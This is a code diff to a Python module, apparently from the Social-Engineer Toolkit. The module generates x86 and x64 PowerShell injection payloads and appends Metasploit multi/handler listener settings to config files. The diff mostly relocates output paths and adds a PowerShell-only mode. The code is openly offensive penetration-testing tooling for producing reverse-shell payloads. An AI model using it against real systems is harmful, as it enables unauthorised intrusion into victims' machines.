@@ -6,6 +6,12 @@ import os
 import time
 from src.core.setcore import *
 
+# check to see if we are just generating powershell code
+powershell_solo = check_options("POWERSHELL_SOLO")
+
+# check if port is there
+port = check_options("PORT=")
+
 # check if we are using auto_migrate
 auto_migrate = check_config("AUTO_MIGRATE=")
 
@@ -30,17 +36,17 @@ if validate_ip(ipaddr) == False:
 
 # prompt what port to listen on for powershell then make an append to the current
 # metasploit answer file
-if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
+if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
     # if we have multi injection on, don't worry about these
     if multi_injection != "on":
         print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
         port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
         if port == "": port = "443"
-        fileopen = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "r")
+        fileopen = file("%s/meta_config_multipyinjector" % (setdir), "r")
         data = fileopen.read()
         match = re.search(port, data)
         if not match:
-            filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
+            filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
             filewrite.write("\nuse exploit/multi/handler\n")
             if auto_migrate == "ON":
                 filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
@@ -50,7 +56,7 @@ if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepat
 # if we have multi injection on, don't worry about these
 if multi_injection != "on":
     # check to see if the meta config multi pyinjector is there
-    if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
+    if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
         if check_options("PORT=") != 0:
             port = check_options("PORT=")
         # if port.options isnt there then prompt
@@ -58,6 +64,9 @@ if multi_injection != "on":
             port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
             if port == "": port = "443"
             update_options("PORT=" + port)
+
+# turn off multi_injection if we are riding solo from the powershell menu
+if powershell_solo == "ON": multi_injection = "off"
 
 # if we are using multi powershell injection
 if multi_injection == "on":
@@ -86,10 +95,10 @@ if multi_injection == "on":
             print_status("Generating x86-based powershell injection code for port: %s" % (ports))
             multi_injection_x86 = multi_injection_x86 + "," +  generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, ports, x86)
 
-            if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
-                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), ports)
+            if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), ports)
                 if port_check == False:
-                    filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
+                    filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
@@ -97,15 +106,15 @@ if multi_injection == "on":
                     filewrite.close()
 
             # if we aren't using multi pyinjector
-            if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
+            if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                 # if meta config isn't created yet then create it
-                if not os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
-                    filewrite = file("%s/src/program_junk/meta_config" % (definepath), "w")
+                if not os.path.isfile("%s/meta_config" % (setdir)):
+                    filewrite = file("%s/meta_config" % (setdir), "w")
                     filewrite.write("")
                     filewrite.close()
-                port_check = check_ports("%s/src/program_junk/meta_config" % (definepath), ports)
+                port_check = check_ports("%s/meta_config" % (setdir), ports)
                 if port_check == False:
-                    filewrite = file("%s/src/program_junk/meta_config" % (definepath), "a")
+                    filewrite = file("%s/meta_config" % (setdir), "a")
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
@@ -134,11 +143,10 @@ if verbose.lower() == "on":
     time.sleep(3)
     print x86
 
-
-filewrite = file("%s/src/program_junk/x64.powershell" % (definepath), "w")
+filewrite = file("%s/x64.powershell" % (setdir), "w")
 filewrite.write(x64)
 filewrite.close()
-filewrite = file("%s/src/program_junk/x86.powershell" % (definepath), "w")
+filewrite = file("%s/x86.powershell" % (setdir), "w")
 filewrite.write(x86)
 filewrite.close()
 print_status("Finished generating powershell injection bypass.")
